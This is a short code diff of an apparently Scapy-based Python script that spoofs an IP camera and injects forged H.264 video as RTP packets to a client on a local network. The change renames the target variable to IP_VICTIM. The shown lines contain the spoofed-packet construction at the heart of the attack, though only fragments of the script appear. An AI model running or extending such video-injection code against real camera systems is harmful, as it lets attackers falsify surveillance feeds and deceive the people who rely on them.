@@ -4,7 +4,7 @@ import struct
 
 IFACE = "en0"
 IP_CAMERA = "192.168.0.81"
-IP_CLIENT = "192.168.0.162"
+IP_VICTIM = "192.168.0.162"
 CLIENT_MAC = "58:1C:F8:51:BD:3C"  
 
 def fragment_nal_unit(nal_unit, mtu=1400):
@@ -78,7 +78,7 @@ def inject_video(h264_file):
                 is_last = (i == len(fragments) - 1)
                 # Stacks the protocols: Hardware, Internet, Connection, Video Protocol, Raw Video Data
                 pkt = Ether(dst=CLIENT_MAC) / \
-                      IP(src=IP_CAMERA, dst=IP_CLIENT) / \
+                      IP(src=IP_CAMERA, dst=IP_VICTIM) / \
                       UDP(sport=sport, dport=dport) / \
                       RTP(version=2, payload_type=96, sequence=seq, 
                           timestamp=timestamp, sourcesync=ssrc, 
